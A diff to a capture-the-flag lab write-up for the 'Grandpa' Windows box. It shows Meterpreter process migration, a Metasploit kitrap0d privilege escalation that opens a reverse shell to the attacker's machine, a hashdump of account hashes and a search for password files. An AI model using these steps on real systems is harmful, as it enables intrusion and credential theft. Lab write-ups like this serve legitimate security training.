@@ -1,7 +1,7 @@
 # Grandpa 10.10.10.14 - Windows
 
- - __User__:
- - __Root__:
+ - __User__: 009 - Day 2
+ - __Root__: 009 - Day 2
 
 ## Initial Attempt, 05/07/2020
 
@@ -185,3 +185,130 @@ msf5 post(multi/recon/local_exploit_suggester) > run
 [*] Post module execution completed
 ```
 All listed locals fail with `Access denied`. Let's explore migrating to a new process.
+
+```powershell
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System
+ 272   4     smss.exe
+ 320   1456  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 324   272   csrss.exe
+ 348   272   winlogon.exe
+ 396   348   services.exe
+ 408   348   lsass.exe
+ 612   396   svchost.exe
+ 680   396   svchost.exe
+ 736   396   svchost.exe
+ 764   396   svchost.exe
+ 800   396   svchost.exe
+ 936   396   spoolsv.exe
+ 964   396   msdtc.exe
+ 1084  396   cisvc.exe
+ 1124  396   svchost.exe
+ 1180  396   inetinfo.exe
+ 1216  396   svchost.exe
+ 1244  1084  cidaemon.exe
+ 1300  1084  cidaemon.exe
+ 1328  396   VGAuthService.exe
+ 1408  396   vmtoolsd.exe
+ 1456  396   svchost.exe
+ 1596  396   svchost.exe
+ 1700  396   alg.exe
+ 1812  612   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1912  396   dllhost.exe
+ 1952  1084  cidaemon.exe
+ 2256  320   rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+ 2308  612   wmiprvse.exe
+ 2756  348   logon.scr
+ 3728  612   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+
+ meterpreter > migrate -P 3728
+[*] Migrating from 2256 to 3728...
+[*] Migration completed successfully.
+ ```
+
+ I decided to try the `davcdata.exe`, no particular reasoning. The process I was in, `2256 - rundll32.exe`, disappeared once I migrated. I decided to recheck `post(multi/recon/local_exploit_suggester)` and ran `kitrap0d` again - and it worked:
+
+ ```powershell
+ msf5 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 10.10.14.53:4444
+[*] Launching notepad to host the exploit...
+[+] Process 2460 launched.
+[*] Reflectively injecting the exploit DLL into 2460...
+[*] Injecting exploit into 2460 ...
+[*] Exploit injected. Injecting payload into 2460...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (176195 bytes) to 10.10.10.14
+[*] Meterpreter session 2 opened (10.10.14.53:4444 -> 10.10.10.14:1032) at 2020-05-08 16:53:38 -0400
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+## Loot
+
+#### Flags
+
+ - User @ `C:\Documents and Settings\Harry\Desktop\user.txt`
+
+ - Root @ `C:\Documents and Settings\Administrator\Desktop\root.txt`
+
+#### Dumps
+
+```powershell
+meterpreter > hashdump
+Administrator:500:0a70918d669baeb307012642393148ab:34dec8a1db14cdde2a21967c3c997548:::
+ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Harry:1008:93c50499355883d1441208923e8628e6:031f5563e0ac4ba538e8ea325479740d:::
+IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
+IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::
+```
+
+```powershell
+C:\>findstr /SI /M "password" *.xml *.ini *.txt
+
+Program Files\Common Files\Microsoft Shared\web server extensions\50\bin\cfgquiet.ini
+Program Files\VMware\VMware Tools\open_source_licenses.txt
+WINDOWS\msdfmap.ini
+WINDOWS\setuplog.txt
+WINDOWS\system32\corebins\I386\SCHEMA.INI
+WINDOWS\system32\icsxml\ipcfg.xml
+WINDOWS\system32\icsxml\pppcfg.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000014_0000000000.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000015_0000000000.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000016_0000000000.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000017_0000000000.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000018_0000000000.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000019_0000000000.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000020_0000000000.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000021_0000000000.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000022_0000000000.xml
+WINDOWS\system32\inetsrv\History\MBSchema_0000000023_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000014_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000015_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000016_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000017_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000018_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000019_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000020_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000021_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000022_0000000000.xml
+WINDOWS\system32\inetsrv\History\MetaBase_0000000023_0000000000.xml
+WINDOWS\system32\inetsrv\MBSchema.xml
+WINDOWS\system32\inetsrv\MetaBase.xml
+WINDOWS\system32\MicrosoftPassport\partner2.xml
+WINDOWS\system32\msppptnr.xml
+WINDOWS\system32\ntdsctrs.ini
+WINDOWS\system32\schema.ini
+WINDOWS\system32\sfmuam.txt
+```
